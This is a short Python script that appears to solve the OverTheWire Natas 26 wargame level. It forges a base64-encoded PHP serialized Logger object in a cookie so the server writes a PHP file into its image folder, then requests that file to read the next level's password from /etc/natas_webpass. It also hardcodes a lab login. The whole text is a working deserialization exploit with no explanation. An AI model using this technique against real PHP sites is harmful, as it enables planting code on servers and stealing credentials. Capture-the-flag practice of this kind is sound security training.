

import base64
from datetime import datetime
import requests
import pprint
import random

TARGET_URL = 'http://natas26.natas.labs.overthewire.org'

AUTH = ('natas26', 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T')

session_id = '8vff86' + str(int(random.random() * 10000000))

file_name = 'img/hacked1901.php'

def serialized_logger_builder(exit_message, output_file):
    return base64.b64encode(
        'O:6:"Logger":3:{s:15:"\x00Logger\x00logFile";s:%d:"%s";s:15:"\x00Logger\x00initMsg";s:0:"";s:15:"\x00Logger\x00exitMsg";s:%d:"%s";}' % (
            len(output_file), output_file,
            len(exit_message), exit_message
        )
    )
r = requests.post(TARGET_URL,
    params={

    },
    cookies={
        'drawing': serialized_logger_builder('<', file_name),
        'PHPSESSID': session_id
    },
    auth=AUTH)
r = requests.post(TARGET_URL,
    params={

    },
    cookies={
        'drawing': serialized_logger_builder('?', file_name),
        'PHPSESSID': session_id
    },
    auth=AUTH)
r = requests.post(TARGET_URL,
    params={

    },
    cookies={
        'drawing': serialized_logger_builder('php echo file_get_contents(\'/etc/natas_webpass/natas27\'); ?>', file_name),
        'PHPSESSID': session_id
    },
    auth=AUTH)
print r
print r.text
r = requests.get(TARGET_URL + '/' + file_name, auth=AUTH, cookies={'PHPSESSID': session_id})
print r
print r.text
print r.headers
print file_name

print serialized_logger_builder('php echo file_get_contents(\'/etc/natas_webpass/natas27\'); ?>', file_name)

